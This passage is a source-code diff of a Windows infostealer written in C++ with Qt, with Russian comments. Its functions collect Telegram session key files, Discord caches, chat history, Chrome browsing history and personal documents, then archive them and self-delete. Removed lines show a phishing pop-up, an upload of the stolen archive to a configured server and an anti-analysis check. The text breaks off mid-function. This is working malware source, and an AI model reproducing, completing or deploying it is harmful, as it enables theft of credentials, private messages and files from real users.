-                        std::regex sessionRegex("Session ID: [a-f0-9-]+");
-                        std::smatch match;
-                        std::string::const_iterator searchStart(content.cbegin());
-                        while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
-                            result += "[Minecraft] Session ID: " + match[0].str() + "\n";
-                            searchStart = match.suffix().first;
-                        }
+    return result;
+}
+
+// Кража данных Telegram
+std::string StealTelegramData() {
+    std::string result;
+    if (!g_mainWindow || !g_mainWindow->config.telegram) return result;
+
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Telegram"));
+        return result;
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
+
+    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
+    if (std::filesystem::exists(telegramPath)) {
+        try {
+            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
+                if (entry.path().filename().string().find("key_data") != std::string::npos ||
+                    entry.path().filename().string().find("settings") != std::string::npos) {
+                    std::ifstream file(entry.path(), std::ios::binary);
+                    if (!file.is_open()) {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Minecraft log: " + entry.path().string()));
-                    } else {
-                        std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Minecraft log: " + entry.path().string()));
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Telegram file: " + entry.path().string()));
+                        continue;
+                    }
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Telegram] File (" + entry.path().filename().string() + "):\n[Binary Data]\n";
+                }
+            }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealTelegramData: " + std::string(e.what())));
+        }
+    }
+
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("Telegram.exe");
+    if (!wsData.empty()) {
+        result += wsData;
+    }
+    std::string webrtcData = CaptureWebRTCSessions("Telegram.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
+    }
+
+    return result;
+}
+
+// Кража истории чатов
+std::string StealChatHistory() {
+    std::string result;
+    if (!g_mainWindow || !g_mainWindow->config.chatHistory) return result;
+
+    // Discord
+    if (g_mainWindow->config.discord) {
+        char* localAppDataPath = nullptr;
+        size_t len;
+        if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get LOCALAPPDATA path for Discord chat history"));
+        } else {
+            std::string localAppData(localAppDataPath);
+            free(localAppDataPath);
+            std::vector<std::string> discordPaths = {
+                localAppData + "\\Discord\\",
+                localAppData + "\\discordcanary\\",
+                localAppData + "\\discordptb\\"
+            };
+            for (const auto& path : discordPaths) {
+                std::string cachePath = path + "Cache\\";
+                if (std::filesystem::exists(cachePath)) {
+                    std::string cacheData = StealAppCacheData("Discord Chat", cachePath);
+                    if (!cacheData.empty()) {
+                        result += cacheData;
                     }
                 }
             }
         }
+    }
 
-        std::string wsData = CaptureWebSocketSessions("Minecraft.exe");
-        if (!wsData.empty()) {
-            result += "[Minecraft] WebSocket Data:\n" + wsData + "\n";
+    // Telegram
+    if (g_mainWindow->config.telegram) {
+        char* appDataPath = nullptr;
+        size_t len;
+        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Telegram chat history"));
+        } else {
+            std::string appData(appDataPath);
+            free(appDataPath);
+            std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
+            if (std::filesystem::exists(telegramPath)) {
+                try {
+                    for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
+                        if (entry.path().filename().string().find("user_data") != std::string::npos) {
+                            std::ifstream file(entry.path(), std::ios::binary);
+                            if (!file.is_open()) {
+                                std::lock_guard<std::mutex> lock(g_mutex);
+                                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Telegram chat file: " + entry.path().string()));
+                                continue;
+                            }
+                            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                            file.close();
+                            result += "[Telegram] Chat Data (" + entry.path().filename().string() + "):\n[Binary Data]\n";
+                        }
+                    }
+                } catch (const std::exception& e) {
+                    std::lock_guard<std::mutex> lock(g_mutex);
+                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealChatHistory (Telegram): " + std::string(e.what())));
+                }
+            }
         }
-
-        std::string webrtcData = CaptureWebRTCSessions("Minecraft.exe");
-        if (!webrtcData.empty()) {
-            result += "[Minecraft] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Minecraft data: " + std::string(e.what())));
     }
 
     return result;
@@ -1572,276 +1629,588 @@ std::string StealMinecraftData() {
 // Кража файлов
 std::vector<std::string> StealFiles() {
     std::vector<std::string> stolenFiles;
-    if (!g_mainWindow || !g_mainWindow->config.files) return stolenFiles;
+    if (!g_mainWindow || !g_mainWindow->config.fileGrabber) return stolenFiles;
 
-    std::vector<std::string> targetDirs = {
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\",
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents\\",
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Downloads\\"
+    std::vector<std::string> directories = {
+        std::string(getenv("USERPROFILE")) + "\\Desktop\\",
+        std::string(getenv("USERPROFILE")) + "\\Documents\\",
+        std::string(getenv("USERPROFILE")) + "\\Downloads\\"
     };
 
-    std::vector<std::string> targetExtensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".xls"};
+    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xls", ".xlsx"};
 
-    for (const auto& dir : targetDirs) {
+    for (const auto& dir : directories) {
         if (!std::filesystem::exists(dir)) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Directory not found for file stealing: " + dir));
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Directory not found for file grabbing: " + dir));
             continue;
         }
 
         try {
             for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
-                if (entry.is_regular_file()) {
-                    std::string ext = entry.path().extension().string();
-                    if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
-                        std::string filePath = entry.path().string();
-                        stolenFiles.push_back(filePath);
+                if (!entry.is_regular_file()) continue;
+
+                auto ext = entry.path().extension().string();
+                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+                if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
+                    std::uintmax_t fileSize = entry.file_size();
+                    if (fileSize > 0 && fileSize < 5 * 1024 * 1024) { // Ограничение в 5 МБ
+                        stolenFiles.push_back(entry.path().string());
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("File collected: " + filePath));
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("File grabbed: " + entry.path().string()));
                     }
                 }
             }
         } catch (const std::exception& e) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing directory for file stealing: " + dir + " - " + e.what()));
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealFiles (" + dir + "): " + std::string(e.what())));
         }
+    }
+
+    // Сохраняем пути в config.files
+    if (g_mainWindow) {
+        g_mainWindow->config.files = stolenFiles;
     }
 
     return stolenFiles;
 }
 
-// Социальная инженерия
-void SocialEngineering() {
-    if (!g_mainWindow || !g_mainWindow->config.socialEngineering) return;
+// Сбор данных для социальной инженерии
+std::string CollectSocialEngineeringData() {
+    std::string result;
+    if (!g_mainWindow || !g_mainWindow->config.socialEngineering) return result;
 
-    std::string phishingMessage = "Your account has been compromised! Please visit http://fake-login-page.com to secure your account.";
-    MessageBoxA(nullptr, phishingMessage.c_str(), "Security Alert", MB_ICONWARNING | MB_OK);
-    std::lock_guard<std::mutex> lock(g_mutex);
-    if (g_mainWindow) g_mainWindow->emitLog(QString("Displayed phishing message"));
-}
-
-// Создание ZIP-архива
-std::string CreateZipArchive(const std::string& data, const std::vector<std::string>& files) {
-    std::string zipPath = "data_" + std::to_string(GetTickCount()) + ".zip";
-    int err = 0;
-    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
-    if (!zip) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP archive: " + zipPath));
-        return "";
+    // Информация о системе
+    std::string sysInfo = GetCustomSystemInfo();
+    if (!sysInfo.empty()) {
+        result += "[Social Engineering] System Info:\n" + sysInfo + "\n";
     }
 
-    // Добавление текстовых данных
-    zip_source_t* source = zip_source_buffer(zip, data.c_str(), data.size(), 0);
-    if (!source) {
-        zip_close(zip);
+    // Недавно открытые файлы
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create ZIP source for text data"));
-        return "";
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for recent files"));
+        return result;
     }
-    if (zip_file_add(zip, "data.txt", source, ZIP_FL_OVERWRITE) < 0) {
-        zip_source_free(source);
-        zip_close(zip);
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to add data.txt to ZIP"));
-        return "";
-    }
+    std::string appData(appDataPath);
+    free(appDataPath);
 
-    // Добавление файлов
-    for (const auto& file : files) {
-        if (std::filesystem::exists(file)) {
-            std::ifstream fileStream(file, std::ios::binary);
-            if (fileStream.is_open()) {
-                std::vector<char> fileData((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
-                fileStream.close();
-                zip_source_t* fileSource = zip_source_buffer(zip, fileData.data(), fileData.size(), 0);
-                if (!fileSource) {
-                    zip_close(zip);
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP source for file: " + file));
-                    return "";
+    std::string recentPath = appData + "\\Microsoft\\Windows\\Recent\\";
+    if (std::filesystem::exists(recentPath)) {
+        try {
+            for (const auto& entry : std::filesystem::directory_iterator(recentPath)) {
+                if (entry.path().extension() == ".lnk") {
+                    result += "[Social Engineering] Recent File: " + entry.path().filename().string() + "\n";
                 }
-                std::string fileName = std::filesystem::path(file).filename().string();
-                if (zip_file_add(zip, fileName.c_str(), fileSource, ZIP_FL_OVERWRITE) < 0) {
-                    zip_source_free(fileSource);
-                    zip_close(zip);
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to add file to ZIP: " + file));
-                    return "";
+            }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in CollectSocialEngineeringData (recent files): " + std::string(e.what())));
+        }
+    }
+
+    // История браузера (пример для Chrome)
+    char* localAppDataPath = nullptr;
+    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get LOCALAPPDATA path for browser history"));
+        return result;
+    }
+    std::string localAppData(localAppDataPath);
+    free(localAppDataPath);
+
+    std::string historyPath = localAppData + "\\Google\\Chrome\\User Data\\Default\\History";
+    if (std::filesystem::exists(historyPath)) {
+        std::string tempHistoryDb = historyPath + "_temp";
+        std::filesystem::copy_file(historyPath, tempHistoryDb, std::filesystem::copy_options::overwrite_existing);
+
+        sqlite3* db = nullptr;
+        if (sqlite3_open(tempHistoryDb.c_str(), &db) == SQLITE_OK) {
+            sqlite3_stmt* stmt = nullptr;
+            const char* query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10";
+            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
+                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
+                    std::string title = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
+                    result += "[Social Engineering] Browser History: " + url + " | " + title + "\n";
                 }
+                sqlite3_finalize(stmt);
             } else {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open file for ZIP: " + file));
+                if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to prepare SQLite statement for browser history"));
+            }
+            sqlite3_close(db);
+        } else {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Chrome History database"));
+        }
+        std::filesystem::remove(tempHistoryDb);
+    }
+
+    return result;
+}
+
+// Сбор всех данных
+std::string CollectData(const std::string& tempDir) {
+    std::string allData;
+
+    // Системная информация
+    if (g_mainWindow && g_mainWindow->config.systemInfo) {
+        std::string sysInfo = GetCustomSystemInfo();
+        if (!sysInfo.empty()) {
+            std::string sysInfoPath = tempDir + "\\system_info.txt";
+            std::ofstream out(sysInfoPath);
+            if (out.is_open()) {
+                out << sysInfo;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("System info saved to: " + sysInfoPath));
+            }
+            allData += "[System Info]\n" + sysInfo + "\n";
+        }
+    }
+
+    // Скриншот
+    if (g_mainWindow && g_mainWindow->config.screenshot) {
+        std::string screenshotPath = TakeScreenshot();
+        if (!screenshotPath.empty()) {
+            std::filesystem::path src(screenshotPath);
+            std::filesystem::path dst(tempDir + "\\" + src.filename().string());
+            std::filesystem::copy_file(src, dst, std::filesystem::copy_options::overwrite_existing);
+            std::filesystem::remove(src);
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) {
+                g_mainWindow->screenshotsPaths.push_back(dst.string());
+                g_mainWindow->emitLog(QString::fromStdString("Screenshot moved to: " + dst.string()));
             }
         }
     }
 
-    zip_close(zip);
-    std::lock_guard<std::mutex> lock(g_mutex);
-    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Created ZIP archive: " + zipPath));
-    return zipPath;
-}
-
-// Отправка данных
-void SendData(const std::string& zipPath) {
-    if (!g_mainWindow || zipPath.empty()) return;
-
-    QNetworkAccessManager* manager = new QNetworkAccessManager(g_mainWindow);
-    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-
-    QHttpPart filePart;
-    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant(QString::fromStdString("form-data; name=\"file\"; filename=\"" + zipPath + "\"")));
-    QFile* file = new QFile(QString::fromStdString(zipPath));
-    if (!file->open(QIODevice::ReadOnly)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open ZIP file for upload: " + zipPath));
-        delete file;
-        delete multiPart;
-        delete manager;
-        return;
-    }
-    filePart.setBodyDevice(file);
-    file->setParent(multiPart);
-    multiPart->append(filePart);
-
-    QNetworkRequest request(QUrl(QString::fromStdString(g_mainWindow->config.uploadUrl)));
-    QNetworkReply* reply = manager->post(request, multiPart);
-    multiPart->setParent(reply);
-
-    QObject::connect(reply, &QNetworkReply::finished, [=]() {
-        if (reply->error() == QNetworkReply::NoError) {
-            std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString("Data uploaded successfully"));
-        } else {
-            std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to upload data: " + reply->errorString().toStdString()));
-        }
-        reply->deleteLater();
-        manager->deleteLater();
-        std::filesystem::remove(zipPath);
-    });
-}
-
-// Сбор всех данных
-void CollectData() {
-    if (!g_mainWindow) return;
-
-    std::string allData;
-
-    // Системная информация
-    std::string systemInfo = GetCustomSystemInfo();
-    if (!systemInfo.empty()) {
-        allData += "[System Info]\n" + systemInfo + "\n";
-    }
-
-    // Скриншот
-    std::string screenshotPath = TakeScreenshot();
-    std::vector<std::string> filesToZip;
-    if (!screenshotPath.empty()) {
-        filesToZip.push_back(screenshotPath);
-    }
-
     // Данные браузеров
-    std::string browserData = StealBrowserData();
-    if (!browserData.empty()) {
-        allData += "[Browser Data]\n" + browserData + "\n";
+    if (g_mainWindow && (g_mainWindow->config.cookies || g_mainWindow->config.passwords)) {
+        std::string browserData = StealBrowserData();
+        if (!browserData.empty()) {
+            std::string browserDataPath = tempDir + "\\browser_data.txt";
+            std::ofstream out(browserDataPath);
+            if (out.is_open()) {
+                out << browserData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Browser data saved to: " + browserDataPath));
+            }
+            allData += "[Browser Data]\n" + browserData + "\n";
+        }
+    }
+
+    // Токены Discord
+    if (g_mainWindow && g_mainWindow->config.discord) {
+        std::string discordData = StealDiscordTokens();
+        if (!discordData.empty()) {
+            std::string discordDataPath = tempDir + "\\discord_data.txt";
+            std::ofstream out(discordDataPath);
+            if (out.is_open()) {
+                out << discordData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Discord data saved to: " + discordDataPath));
+            }
+            allData += "[Discord Data]\n" + discordData + "\n";
+        }
     }
 
     // Данные Steam
-    std::string steamData = StealSteamData();
-    if (!steamData.empty()) {
-        allData += "[Steam Data]\n" + steamData + "\n";
+    if (g_mainWindow && g_mainWindow->config.steam) {
+        std::string steamData = StealSteamData();
+        if (!steamData.empty()) {
+            std::string steamDataPath = tempDir + "\\steam_data.txt";
+            std::ofstream out(steamDataPath);
+            if (out.is_open()) {
+                out << steamData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Steam data saved to: " + steamDataPath));
+            }
+            allData += "[Steam Data]\n" + steamData + "\n";
+        }
     }
 
     // Данные Epic Games
-    std::string epicData = StealEpicGamesData();
-    if (!epicData.empty()) {
-        allData += "[Epic Games Data]\n" + epicData + "\n";
+    if (g_mainWindow && g_mainWindow->config.epic) {
+        std::string epicData = StealEpicData();
+        if (!epicData.empty()) {
+            std::string epicDataPath = tempDir + "\\epic_data.txt";
+            std::ofstream out(epicDataPath);
+            if (out.is_open()) {
+                out << epicData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Epic Games data saved to: " + epicDataPath));
+            }
+            allData += "[Epic Games Data]\n" + epicData + "\n";
+        }
     }
 
     // Данные Roblox
-    std::string robloxData = StealRobloxData();
-    if (!robloxData.empty()) {
-        allData += "[Roblox Data]\n" + robloxData + "\n";
+    if (g_mainWindow && g_mainWindow->config.roblox) {
+        std::string robloxData = StealRobloxData();
+        if (!robloxData.empty()) {
+            std::string robloxDataPath = tempDir + "\\roblox_data.txt";
+            std::ofstream out(robloxDataPath);
+            if (out.is_open()) {
+                out << robloxData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Roblox data saved to: " + robloxDataPath));
+            }
+            allData += "[Roblox Data]\n" + robloxData + "\n";
+        }
     }
 
     // Данные Battle.net
-    std::string battleNetData = StealBattleNetData();
-    if (!battleNetData.empty()) {
-        allData += "[Battle.net Data]\n" + battleNetData + "\n";
-    }
-
-    // Данные Discord
-    std::string discordData = StealDiscordData();
-    if (!discordData.empty()) {
-        allData += "[Discord Data]\n" + discordData + "\n";
-    }
-
-    // Данные Telegram
-    std::string telegramData = StealTelegramData();
-    if (!telegramData.empty()) {
-        allData += "[Telegram Data]\n" + telegramData + "\n";
+    if (g_mainWindow && g_mainWindow->config.battlenet) {
+        std::string battlenetData = StealBattleNetData();
+        if (!battlenetData.empty()) {
+            std::string battlenetDataPath = tempDir + "\\battlenet_data.txt";
+            std::ofstream out(battlenetDataPath);
+            if (out.is_open()) {
+                out << battlenetData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Battle.net data saved to: " + battlenetDataPath));
+            }
+            allData += "[Battle.net Data]\n" + battlenetData + "\n";
+        }
     }
 
     // Данные Minecraft
-    std::string minecraftData = StealMinecraftData();
-    if (!minecraftData.empty()) {
-        allData += "[Minecraft Data]\n" + minecraftData + "\n";
+    if (g_mainWindow && g_mainWindow->config.minecraft) {
+        std::string minecraftData = StealMinecraftData();
+        if (!minecraftData.empty()) {
+            std::string minecraftDataPath = tempDir + "\\minecraft_data.txt";
+            std::ofstream out(minecraftDataPath);
+            if (out.is_open()) {
+                out << minecraftData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Minecraft data saved to: " + minecraftDataPath));
+            }
+            allData += "[Minecraft Data]\n" + minecraftData + "\n";
+        }
     }
 
-    // Кража файлов
-    std::vector<std::string> stolenFiles = StealFiles();
-    filesToZip.insert(filesToZip.end(), stolenFiles.begin(), stolenFiles.end());
-
-    // Социальная инженерия
-    SocialEngineering();
-
-    // Шифрование данных
-    std::string encryptedData;
-    try {
-        encryptedData = EncryptData(allData, g_mainWindow->config.encryptionKey1, g_mainWindow->config.encryptionKey2, g_mainWindow->config.encryptionSalt);
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Data encrypted successfully"));
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
-        return;
+    // Данные Telegram
+    if (g_mainWindow && g_mainWindow->config.telegram) {
+        std::string telegramData = StealTelegramData();
+        if (!telegramData.empty()) {
+            std::string telegramDataPath = tempDir + "\\telegram_data.txt";
+            std::ofstream out(telegramDataPath);
+            if (out.is_open()) {
+                out << telegramData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Telegram data saved to: " + telegramDataPath));
+            }
+            allData += "[Telegram Data]\n" + telegramData + "\n";
+        }
     }
 
-    // Создание ZIP-архива
-    std::string zipPath = CreateZipArchive(encryptedData, filesToZip);
-    if (zipPath.empty()) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create ZIP archive, aborting upload"));
-        return;
+    // История чатов
+    if (g_mainWindow && g_mainWindow->config.chatHistory) {
+        std::string chatData = StealChatHistory();
+        if (!chatData.empty()) {
+            std::string chatDataPath = tempDir + "\\chat_history.txt";
+            std::ofstream out(chatDataPath);
+            if (out.is_open()) {
+                out << chatData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Chat history saved to: " + chatDataPath));
+            }
+            allData += "[Chat History]\n" + chatData + "\n";
+        }
     }
 
-    // Отправка данных
-    SendData(zipPath);
+    // Данные для социальной инженерии
+    if (g_mainWindow && g_mainWindow->config.socialEngineering) {
+        std::string seData = CollectSocialEngineeringData();
+        if (!seData.empty()) {
+            std::string seDataPath = tempDir + "\\social_engineering.txt";
+            std::ofstream out(seDataPath);
+            if (out.is_open()) {
+                out << seData;
+                out.close();
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Social engineering data saved to: " + seDataPath));
+            }
+            allData += "[Social Engineering]\n" + seData + "\n";
+        }
+    }
+
+    // Сохранение всех текстовых данных в один файл
+    std::string allDataPath = tempDir + "\\collected_data.txt";
+    std::ofstream out(allDataPath);
+    if (out.is_open()) {
+        out << allData;
+        out.close();
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("All collected data saved to: " + allDataPath));
+    }
+
+    // Файлы (граббер)
+    std::vector<std::string> filesToZip;
+    if (g_mainWindow && g_mainWindow->config.fileGrabber) {
+        std::vector<std::string> stolenFiles = StealFiles();
+        for (const auto& file : stolenFiles) {
+            std::filesystem::path src(file);
+            std::filesystem::path dst(tempDir + "\\files\\" + src.filename().string());
+            std::filesystem::create_directories(dst.parent_path());
+            std::filesystem::copy_file(src, dst, std::filesystem::copy_options::overwrite_existing);
+            filesToZip.push_back(dst.string());
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("File copied to temp dir: " + dst.string()));
+        }
+    }
+
+    return allDataPath;
 }
 
-// Основная функция
-int main(int argc, char* argv[]) {
-    QApplication app(argc, argv);
-    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
-
-    g_mainWindow = new MainWindow();
-    if (AntiAnalysis()) {
-        delete g_mainWindow;
-        Gdiplus::GdiplusShutdown(gdiplusToken);
-        return 1;
+// Архивация данных
+std::string ArchiveData(const std::string& tempDir) {
+    std::string zipPath = tempDir + "\\data.zip";
+    int err = 0;
+    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
+    if (!zip) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP archive: " + std::to_string(err)));
+        return "";
     }
 
+    try {
+        for (const auto& entry : std::filesystem::recursive_directory_iterator(tempDir)) {
+            if (entry.is_regular_file() && entry.path().extension() != ".zip") {
+                std::string relativePath = std::filesystem::relative(entry.path(), tempDir).string();
+                std::ifstream file(entry.path(), std::ios::binary);
+                if (!file.is_open()) {
+                    std::lock_guard<std::mutex> lock(g_mutex);
+                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open file for archiving: " + entry.path().string()));
+                    continue;
+                }
+
+                std::vector<char> content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                file.close();
+
+                zip_source_t* source = zip_source_buffer(zip, content.data(), content.size(), 0);
+                if (!source) {
+                    std::lock_guard<std::mutex> lock(g_mutex);
+                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP source for: " + relativePath));
+                    continue;
+                }
+
+                if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
+                    zip_source_free(source);
+                    std::lock_guard<std::mutex> lock(g_mutex);
+                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to add file to ZIP: " + relativePath));
+                }
+            }
+        }
+    } catch (const std::exception& e) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in ArchiveData: " + std::string(e.what())));
+        zip_close(zip);
+        return "";
+    }
+
+    if (zip_close(zip) < 0) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to close ZIP archive: " + zip_error_strerror(zip_get_error(zip))));
+        return "";
+    }
+
+    std::lock_guard<std::mutex> lock(g_mutex);
+    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Data archived to: " + zipPath));
+    return zipPath;
+}
+
+// Самоуничтожение
+void SelfDestruct() {
+    if (!g_mainWindow || !g_mainWindow->config.selfDestruct) return;
+
+    char path[MAX_PATH] = {0};
+    GetModuleFileNameA(nullptr, path, MAX_PATH);
+    std::string batchFile = std::string(getenv("TEMP")) + "\\self_destruct.bat";
+    std::ofstream bat(batchFile);
+    if (bat.is_open()) {
+        bat << "@echo off\n";
+        bat << "timeout /t 1 /nobreak > nul\n";
+        bat << "del \"" << path << "\"\n";
+        bat << "del \"%~f0\"\n";
+        bat.close();
+
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        if (CreateProcessA(nullptr, (LPSTR)batchFile.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Self-destruct initiated"));
+        } else {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to initiate self-destruct"));
+        }
+    } else {
+        std::lock_guard<std::mutex> lock(g_mutex);
